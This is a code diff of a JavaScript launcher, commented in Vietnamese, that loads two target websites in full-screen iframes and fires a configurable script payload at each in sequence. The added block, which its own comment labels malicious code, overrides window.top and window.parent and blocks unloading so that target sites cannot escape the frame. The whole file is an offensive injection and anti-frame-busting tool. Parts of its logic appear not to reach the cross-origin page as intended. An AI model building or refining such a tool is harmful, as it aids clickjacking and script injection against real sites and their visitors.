@@ -1,6 +1,6 @@
 // ============================================================
-// NT4NH2 // LAUNCHER SCRIPT (SEQUENCE INJECTION)
-// Tự động chuyển trang và inject liên tiếp
+// NT4NH2 // LAUNCHER SCRIPT (ANTI-F5 LOOP & SANDBOX)
+// Chống Frame-Busting ép F5 toàn trang
 // ============================================================
 
 const DEFAULT_CONFIG = {
@@ -18,7 +18,6 @@ function loadConfig() {
   if (!raw) return { ...DEFAULT_CONFIG };
   try { 
     const cfg = { ...DEFAULT_CONFIG, ...JSON.parse(raw) };
-    // Tương thích ngược nếu lưu config cũ
     if (cfg.targetUrl && !cfg.targetUrl1) { cfg.targetUrl1 = cfg.targetUrl; }
     return cfg;
   }
@@ -69,7 +68,31 @@ function setStatus(msg) {
   statusEl.textContent = "Trạng thái: " + msg;
 }
 
-// Kỹ thuật Inject qua iframe trắng
+// Mã độc chèn vào iframe để chống F5 Loop
+const ANTI_BUST_SCRIPT = `
+  <script>
+    // Vô hiệu hóa quyền truy cập top/parent để chống Frame-Busting
+    try {
+      Object.defineProperty(window, 'top', { get: function() { return window; } });
+      Object.defineProperty(window, 'parent', { get: function() { return window; } });
+    } catch(e) {}
+    
+    // Chặn các nỗ lực chuyển hướng bằng location
+    window.onbeforeunload = function() { return null; };
+    
+    // Lắng nghe tín hiệu từ trang mẹ
+    window.addEventListener("message", function(e) {
+      if (e.data === "RUN_PAYLOAD") {
+        try {
+          ${CONFIG.payload}
+        } catch (err) {
+          console.error("Payload Error:", err);
+        }
+      }
+    });
+  </script>
+`;
+
 function launchTool() {
   popupShown = false;
   setStatus("Đang khởi tạo môi trường Inject...");
@@ -78,7 +101,9 @@ function launchTool() {
     currentIframe.remove();
   }
 
+  // Tạo iframe cô lập (Sandbox cho phép script và same-origin)
   currentIframe = document.createElement("iframe");
+  currentIframe.setAttribute("sandbox", "allow-scripts allow-same-origin allow-forms allow-popups");
   currentIframe.style.width = "100vw";
   currentIframe.style.height = "100vh";
   currentIframe.style.position = "fixed";
@@ -95,29 +120,20 @@ function launchTool() {
       const iframeDoc = currentIframe.contentWindow.document;
       iframeDoc.open();
       
-      // Tạo cấu trúc HTML cho trang 1
+      // Ghi đè cấu trúc chống F5 Loop
       iframeDoc.write(`
         <!DOCTYPE html>
         <html>
         <head>
-          <script>
-            window.addEventListener("message", function(e) {
-              if (e.data === "RUN_PAYLOAD") {
-                try {
-                  ${CONFIG.payload}
-                } catch (err) {
-                  console.error("Payload Error:", err);
-                }
-              }
-            });
-          </script>
+          ${ANTI_BUST_SCRIPT}
         </head>
         <body style="margin:0; padding:0; overflow:hidden;">
-          <iframe id="innerFrame" src="${CONFIG.targetUrl1}" style="width:100%; height:100vh; border:none;"></iframe>
+          <iframe id="innerFrame" src="${CONFIG.targetUrl1}" style="width:100%; height:100vh; border:none;" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
           <script>
-            // Chờ để chuyển sang trang 2 sau thời gian delay
+            // Tự động chuyển sang trang 2 sau delay
             setTimeout(function() {
-              document.getElementById('innerFrame').src = "${CONFIG.targetUrl2}";
+              const inner = document.getElementById('innerFrame');
+              if (inner) inner.src = "${CONFIG.targetUrl2}";
             }, ${CONFIG.delay});
           </script>
         </body>
@@ -125,15 +141,15 @@ function launchTool() {
       `);
       iframeDoc.close();
 
-      // Inject lần 1 (Trang 1)
+      // Inject Payload lần 1
       setTimeout(() => {
         if (currentIframe && currentIframe.contentWindow) {
           currentIframe.contentWindow.postMessage("RUN_PAYLOAD", "*");
           setStatus("Đã Inject Trang 1. Chờ chuyển Trang 2...");
         }
-      }, 1000); // Inject sau 1s khi trang 1 bắt đầu load
+      }, 1000);
 
-      // Inject lần 2 (Trang 2) sau khi chuyển hướng
+      // Inject Payload lần 2 (Sau khi chuyển trang)
       setTimeout(() => {
         if (currentIframe && currentIframe.contentWindow) {
           currentIframe.contentWindow.postMessage("RUN_PAYLOAD", "*");
